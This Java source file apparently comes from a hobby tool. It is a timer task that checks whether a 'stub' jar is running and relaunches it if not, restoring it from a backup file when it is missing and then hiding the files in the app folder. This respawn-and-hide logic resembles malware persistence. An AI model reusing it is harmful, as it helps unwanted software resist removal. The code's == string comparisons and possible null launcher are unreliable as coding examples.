import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.TimerTask;

/**
 * Created by Kevin on 4/6/2017.
 */
class loop extends TimerTask {
    public void run() {
        if (core.stubStatus == "Running") {
            if (core.isStillAllive(core.stubPID)) {
                debug.addLine("Stil open!\n", Color.ORANGE, 12, false);
            } else {
                debug.addLine("Not open!\n", Color.ORANGE, 12, false);
                File stub = new File(core.stubLoc + File.separator + core.stubName + ".jar");
                debug.addLine("STUB LOCATION: " + core.stubLoc + File.separator + core.stubName + ".jar" + "\n", Color.ORANGE, 12, false);
                if (stub.exists()) {
                    debug.addLine("RELAUNCH STUB: Stub still there." + "\n", Color.ORANGE, 12, false);
                    File[] files = core.grabFilesInFolders(core.myAppPath);
                    for (File file : files) {
                        if (file.getName().endsWith(".jsi")){
                            file.delete();
                        }
                    }
                    launcher jr = null;
                    try {
                        jr = new launcher(stub);
                    } catch (ClassNotFoundException e) {
                        debug.addLine("LAUNCHSTUB: ERROR" + e.toString() + "\n", Color.red, 12, false);
                    } catch (IOException e) {
                        debug.addLine("LAUNCHSTUB: ERROR" + e.toString() + "\n", Color.red, 12, false);
                    } catch (NoSuchMethodException e) {
                        debug.addLine("LAUNCHSTUB: ERROR" + e.toString() + "\n", Color.red, 12, false);
                    }
                    try {
                        jr.run(new String[]{"", ""});
                        core.stubStatus = "Looking";
                    } catch (IllegalAccessException e) {
                        debug.addLine("LAUNCHSTUB: ERROR" + e.toString() + "\n", Color.red, 12, false);
                    } catch (InvocationTargetException e) {
                        debug.addLine("LAUNCHSTUB: ERROR" + e.toString() + "\n", Color.red, 12, false);
                    }
                } else {
                    if (core.backup) {
                        debug.addLine("STUB BACKUP: Stub not there." + "\n", Color.ORANGE, 12, false);
                        File backupFile = new File("backup.vbc");
                        if (backupFile.exists()) {
                            debug.addLine("BACKUP EXISTS" + "\n", Color.ORANGE, 12, false);
                            try {
                                debug.addLine("RELAUNCH STUB: Stub not there." + "\n", Color.ORANGE, 12, false);
                                core.copyFileUsingStream(backupFile, stub);
                                File[] files = core.grabFilesInFolders(core.myAppPath);
                                for (File file : files) {
                                    if (file.getName().endsWith(".jsi")){
                                        file.delete();
                                    }
                                }
                                launcher jr = null;
                                try {
                                    jr = new launcher(stub);
                                } catch (ClassNotFoundException e) {
                                    debug.addLine("LAUNCHSTUB: ERROR" + e.toString() + "\n", Color.red, 12, false);
                                } catch (IOException e) {
                                    debug.addLine("LAUNCHSTUB: ERROR" + e.toString() + "\n", Color.red, 12, false);
                                } catch (NoSuchMethodException e) {
                                    debug.addLine("LAUNCHSTUB: ERROR" + e.toString() + "\n", Color.red, 12, false);
                                }
                                try {
                                    jr.run(new String[]{"", ""});
                                    core.stubStatus = "Looking";
                                } catch (IllegalAccessException e) {
                                    debug.addLine("LAUNCHSTUB: ERROR" + e.toString() + "\n", Color.red, 12, false);
                                } catch (InvocationTargetException e) {
                                    debug.addLine("LAUNCHSTUB: ERROR" + e.toString() + "\n", Color.red, 12, false);
                                }
                            } catch (IOException e) {
                                debug.addLine("Couldn't move backup. ERROR:" + e.toString() + "\n", Color.RED, 12, false);
                            }
                        } else {
                            debug.addLine("Couldn't find backup....\n", Color.ORANGE, 12, false);
                        }
                    } else {
                        debug.addLine("File couldn't be found and backup isn't on!\n", Color.ORANGE, 12, false);
                    }
                }
            }
        }else if(core.stubStatus == "Looking"){
            String jsiName = core.isStubInfoFile();
            if(jsiName == "null"){
                core.stubStatus = "Looking";
                debug.addLine("File isn't there!\n", Color.YELLOW, 12, false);
            }else{
                core.stubStatus = "Setting up";
                debug.addLine("File is there! " + jsiName + "\n", Color.GREEN, 12, false);
                core.findSetAPPID(jsiName);
                core.setStubInfo(core.stubFile);
                try {
                    core.doRequiredStubWork(core.stubInfo);
                } catch (Exception e) {
                }
                core.hideAllFilesINFolder(core.myAppPath);
                core.stubStatus = "Running";
                core.startLoop();
            }
        }
    }
}